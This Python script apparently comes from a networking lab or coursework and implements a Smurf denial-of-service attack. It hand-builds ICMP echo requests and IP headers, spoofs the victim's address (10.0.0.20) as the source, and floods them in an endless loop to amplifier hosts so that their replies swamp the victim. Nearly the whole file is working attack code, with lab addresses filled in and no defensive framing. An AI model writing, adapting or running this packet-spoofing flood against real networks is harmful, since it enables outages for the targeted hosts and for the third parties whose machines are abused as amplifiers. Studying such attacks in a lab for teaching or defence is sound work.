#!/usr/bin/env python3
import socket
import struct
import time
import signal
import sys

## Function to compute cheksum
def cheksum(packet):
    #Calculating the cheksum of the packet
    # Ref R. T. Braden, D. A. Borman, and C. Partridge, “Computing the Internet checksum,” Sep. 1988, doi: https://doi.org/10.17487/rfc1071.
    # REF- “Python and socket library - Raspberry Pi Forums,” Raspberrypi.com, 2024. https://forums.raspberrypi.com/viewtopic.php?t=362742
    # Calculate the ICMP cheksum
    cheksum = 0
    for i in range(0, len(packet), 2):
        cheksum += (packet[i] << 8) + (
            struct.unpack('B', packet[i + 1:i + 2])[0]
            if len(packet[i + 1:i + 2]) else 0
        )

    cheksum = (cheksum >> 16) + (cheksum & 0xFFFF)
    cheksum = ~cheksum & 0xFFFF
    return cheksum

# Function to create an ICMP packet
def create_icmp_packet(sequence):
    # ICMP Echo Request has:
    # type = 8, code = 0 id, sequence
    # Ref-“ICMP (Internet Control Message Protocol),” NetworkLessons.com, Jul. 22, 2015. https://networklessons.com/cisco/ccie-routing-switching-written/icmp-internet-control-message-protocol
    # ICMP ID to identify our packet (ideally unique and using some random number) but for now,I have kept it 0xFFFF
    icmp_id = 0xFFFF
    icmp_type = 8
    icmp_code = 0
    data = struct.pack("3s",b'aaa')
    # Here we are creating the header of the ICMP packet, but checksum is inititalized to 0 as we will calculate it later
    header = struct.pack("!BBHHH3s", 
                        icmp_type, 
                        icmp_code, 
                        0, 
                        icmp_id, 
                        sequence,
                        data)
    chksum = cheksum(header)
    packet = struct.pack("!BBHHH3s", 
                        icmp_type, 
                        icmp_code, 
                        chksum, 
                        icmp_id, 
                        sequence,
                        data)
    return packet

# Here we are manually creating the IP header unlike the last few ICMP iterations, to spoof IP addresses mainly
def create_ip_header(src_ip, dest_ip, payload_length):
    # Ref - cisco, “IPv4 Packet Header,” NetworkLessons.com, Jul. 15, 2015. https://networklessons.com/cisco/ccna-routing-switching-icnd1-100-105/ipv4-packet-header
    # IPv4 header fields:
    # version and header length 4,5, packed into version_iphl
    # IP Identification to identify our packet (ideally unique and using some random number) but for now,I have kept it 0xFFFF
    version_iphl = (4 << 4) | 5  
    tos = 0
    total_length = socket.htons(20 + payload_length)  # IP header (20 bytes) + payload length
    identification = 0xFFFF
    flags_fragment_offset = 0
    ttl = 64
    #Type of protocol
    protocol = socket.IPPROTO_ICMP
    #As we are iterating over many ip's this filed will change and we will spoff the source IP
    # to that of our target machine
    source_ip = socket.inet_aton(src_ip)
    # It will look like the taget is sending the icmp echo messages
    destination_ip = socket.inet_aton(dest_ip)

    # Packing the IP header without checksum first as we did with icmp header
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        version_iphl,
        tos,
        total_length,
        identification,
        flags_fragment_offset,
        ttl,
        protocol,
        0,
        source_ip,
        destination_ip,
    )

    # Calculating the  checksum for the IP header and repacking it with the correct checksum
    header_cheksum = cheksum(ip_header)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        version_iphl,
        tos,
        total_length,
        identification,
        flags_fragment_offset,
        ttl,
        protocol,
        header_cheksum,
        source_ip,
        destination_ip,
    )

    return ip_header

# Handling exit on SIGINT (Ctrl+C)
def signal_handler(sig, frame):
    print("\n Stopping Smurf attack...")
    sys.exit(0)

# Function to perform Smurf attack
def smurf_attack(dest_ip, amplification_ips):
    try:
        # Create raw socket for sending packets
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        # Tell the kernel not to add a IP header
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
    except Exception as e:
        print("Socket creation failed:", {e})
        return

    print(f"Starting Smurf attack... Press Ctrl+C to stop.")
    # Initialize sequence number, keep updating it for each packet 
    sequence_number = 1

    # Send many packets(Flood) until interrupted by Ctrl+C
    while True:
        try:
            # Iterating over all the ips in broadcase and sending then icmp echo for which they will respond
            for ip in amplification_ips:
                # Create ICMP Echo Request packet like previous iterations
                icmp_packet = create_icmp_packet(sequence_number)

                # Createing spoofed IP header
                ip_header = create_ip_header(dest_ip, ip, len(icmp_packet))

                # Combining IP header and ICMP packet into a single packet
                packet = ip_header + icmp_packet

                # Send the spoofed packet to the broadcast address or individual devices in the network
                sock.sendto(packet, (ip, 1))
                print(f"Sent spoofed ICMP Echo Request #{sequence_number} from {dest_ip} to {ip}")

            sequence_number += 1

            # adding delay between packets sending
            time.sleep(0.1)

        except KeyboardInterrupt:
            # Registering signal handler for Ctrl+C
            signal_handler(None, None)  

        except Exception as e:
            print(f"Failed to send packet: e")
            break

if __name__ == '__main__':
    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)

    # The destination IP address of the target 
    dest_ip = "10.0.0.20" 
    
    # List of nodes in network for amplification
    amplification_ips = [
        #"10.0.0.20",   #not including the original IP(own IP)
        "10.0.1.21",    
        "10.0.1.22",     
     ]

    smurf_attack(dest_ip,amplification_ips )
